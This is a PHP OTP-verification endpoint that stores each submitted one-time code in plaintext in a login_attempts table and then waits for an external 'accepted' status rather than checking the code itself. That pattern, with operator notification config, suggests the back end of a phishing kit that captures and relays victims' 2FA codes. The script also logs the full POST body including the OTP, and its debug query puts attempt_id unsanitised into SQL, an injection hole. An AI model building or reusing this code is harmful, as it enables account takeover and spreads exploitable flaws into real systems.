<?php
ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_log('c:/xampp/php/logs/php_error.log');

error_log("otp-verification.php: Script started");

include 'db_connect.php';
include 'notification_config.php';

// Ensure no output before JSON response
ob_start();

// Log database connection status
if ($conn->connect_error) {
    error_log("Database connection failed: " . $conn->connect_error);
} else {
    error_log("Database connection successful");
}

header('Content-Type: application/json');

try {
    // Get POST data
    $attemptId = $_POST['attempt_id'] ?? 0;
    $otp = $_POST['otp'] ?? '';

    // Log POST data
    error_log("POST data: " . json_encode($_POST));

    // Log the OTP entered by the user
    $sql = "UPDATE login_attempts SET otp_plain = ?, status = 'pending' WHERE id = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("si", $otp, $attemptId);
    $stmt->execute();

    // Check the status immediately without delay
    $checkSql = "SELECT status FROM login_attempts WHERE id = ?";
    $checkStmt = $conn->prepare($checkSql);
    $checkStmt->bind_param("i", $attemptId);
    $checkStmt->execute();
    $result = $checkStmt->get_result();

    if ($result->num_rows === 1) {
        $row = $result->fetch_assoc();
        if ($row['status'] === 'accepted') {
            echo json_encode(['success' => true, 'approved' => true]);
        } else {
            echo json_encode(['success' => true, 'approved' => false]);
        }
    } else {
        echo json_encode(['success' => false, 'message' => 'Failed to verify OTP.']);
    }

    // Log database content for debugging
    $sqlDebug = "SELECT id, status FROM login_attempts WHERE id = $attemptId";
    $resultDebug = $conn->query($sqlDebug);
    if ($resultDebug->num_rows > 0) {
        while ($rowDebug = $resultDebug->fetch_assoc()) {
            error_log("Database record: " . json_encode($rowDebug));
        }
    } else {
        error_log("No matching records found in the database for id = $attemptId");
    }

    $stmt->close();
    $conn->close();
} catch (Exception $e) {
    error_log($e->getMessage());
    echo json_encode(['success' => false, 'message' => 'An unexpected error occurred.']);
}

// End of script
ob_end_flush(); // Flush the output buffer and send the response
?>